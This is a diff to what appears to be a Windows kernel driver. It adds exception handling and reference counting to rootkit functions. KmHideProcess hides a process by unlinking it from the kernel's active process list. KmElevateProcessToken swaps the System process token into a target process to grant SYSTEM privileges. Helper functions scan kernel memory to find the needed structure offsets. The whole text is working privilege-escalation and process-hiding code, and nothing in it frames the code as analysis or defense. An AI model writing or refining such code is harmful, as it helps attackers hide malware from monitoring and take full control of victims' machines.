@@ -16,10 +16,17 @@ static ULONG FindUniqueProcessIdOffset( VOID )
 	HANDLE SystemPid = PsGetProcessId( PsInitialSystemProcess );
 	ULONG  Offset;
 
-	for ( Offset = 0; Offset < 0x600; Offset += sizeof( ULONG_PTR ) )
+	__try
 	{
-		if ( *(PHANDLE)( (PUCHAR)PsInitialSystemProcess + Offset ) == SystemPid )
-			return Offset;
+		for ( Offset = 0; Offset < 0x600; Offset += sizeof( ULONG_PTR ) )
+		{
+			if ( *(PHANDLE)( (PUCHAR)PsInitialSystemProcess + Offset ) == SystemPid )
+				return Offset;
+		}
+	}
+	__except ( EXCEPTION_EXECUTE_HANDLER )
+	{
+		return 0;
 	}
 
 	return 0;
@@ -41,16 +48,24 @@ static ULONG FindTokenOffset( VOID )
 	Token = PsReferencePrimaryToken( PsInitialSystemProcess );
 	TokenPtr = (ULONG64)(ULONG_PTR)Token;
 
-	for ( Offset = 0; Offset < 0x800; Offset += sizeof( ULONG_PTR ) )
+	__try
 	{
-		ULONG64 Value = *(PULONG64)( (PUCHAR)PsInitialSystemProcess + Offset );
-
-		/* EX_FAST_REF: low 4 bits are ref count on x64, low 3 on x86 */
-		if ( ( Value & ~(ULONG64)0xF ) == TokenPtr )
+		for ( Offset = 0; Offset < 0x800; Offset += sizeof( ULONG_PTR ) )
 		{
-			PsDereferencePrimaryToken( Token );
-			return Offset;
+			ULONG64 Value = *(PULONG64)( (PUCHAR)PsInitialSystemProcess + Offset );
+
+			/* EX_FAST_REF: low 4 bits are ref count on x64 */
+			if ( ( Value & ~(ULONG64)0xF ) == TokenPtr )
+			{
+				PsDereferencePrimaryToken( Token );
+				return Offset;
+			}
 		}
+	}
+	__except ( EXCEPTION_EXECUTE_HANDLER )
+	{
+		PsDereferencePrimaryToken( Token );
+		return 0;
 	}
 
 	PsDereferencePrimaryToken( Token );
@@ -108,13 +123,21 @@ NTSTATUS KmHideProcess(
 
 	Entry = (PLIST_ENTRY)( (PUCHAR)Process + g_ActiveProcessLinksOffset );
 
-	/* Unlink from the doubly-linked list */
-	Entry->Blink->Flink = Entry->Flink;
-	Entry->Flink->Blink = Entry->Blink;
+	__try
+	{
+		/* Unlink from the doubly-linked list */
+		Entry->Blink->Flink = Entry->Flink;
+		Entry->Flink->Blink = Entry->Blink;
 
-	/* Point to self — prevents BSOD during process teardown */
-	Entry->Flink = Entry;
-	Entry->Blink = Entry;
+		/* Point to self — prevents BSOD during process teardown */
+		Entry->Flink = Entry;
+		Entry->Blink = Entry;
+	}
+	__except ( EXCEPTION_EXECUTE_HANDLER )
+	{
+		ObDereferenceObject( Process );
+		return GetExceptionCode();
+	}
 
 	ObDereferenceObject( Process );
 
@@ -135,8 +158,13 @@ NTSTATUS KmElevateProcessToken(
 	IN HANDLE ProcessId
 )
 {
-	PEPROCESS Process = NULL;
-	NTSTATUS  Status;
+	PEPROCESS     Process = NULL;
+	NTSTATUS      Status;
+	PACCESS_TOKEN SystemToken;
+	ULONG64       NewFastRef;
+	ULONG64       OldFastRef;
+	PVOID         OldTokenPtr;
+	BOOLEAN       SwapDone = FALSE;
 
 	if ( g_TokenOffset == 0 )
 		return STATUS_DEVICE_NOT_READY;
@@ -145,10 +173,43 @@ NTSTATUS KmElevateProcessToken(
 	if ( !NT_SUCCESS( Status ) )
 		return Status;
 
-	/* Copy the raw EX_FAST_REF token value from System to target */
-	*(PULONG64)( (PUCHAR)Process + g_TokenOffset ) =
-		*(PULONG64)( (PUCHAR)PsInitialSystemProcess + g_TokenOffset );
+	/* Acquire a reference on the System token */
+	SystemToken = PsReferencePrimaryToken( PsInitialSystemProcess );
+	if ( !SystemToken )
+	{
+		ObDereferenceObject( Process );
+		return STATUS_NOT_FOUND;
+	}
 
+	NewFastRef = (ULONG64)(ULONG_PTR)SystemToken | 0xF;
+
+	__try
+	{
+		/* Atomically swap the token field, capturing the old value */
+		OldFastRef = (ULONG64)InterlockedExchange64(
+			(PLONG64)( (PUCHAR)Process + g_TokenOffset ),
+			(LONG64)NewFastRef
+		);
+		SwapDone = TRUE;
+
+		/* Extract and dereference the old token */
+		OldTokenPtr = (PVOID)(ULONG_PTR)( OldFastRef & ~(ULONG64)0xF );
+		if ( OldTokenPtr )
+			ObDereferenceObject( OldTokenPtr );
+	}
+	__except ( EXCEPTION_EXECUTE_HANDLER )
+	{
+		if ( !SwapDone )
+		{
+			/* Swap never happened — release our System token reference */
+			PsDereferencePrimaryToken( SystemToken );
+		}
+
+		ObDereferenceObject( Process );
+		return GetExceptionCode();
+	}
+
+	/* The System token reference transfers to the target's EX_FAST_REF */
 	ObDereferenceObject( Process );
 
 	return STATUS_SUCCESS;
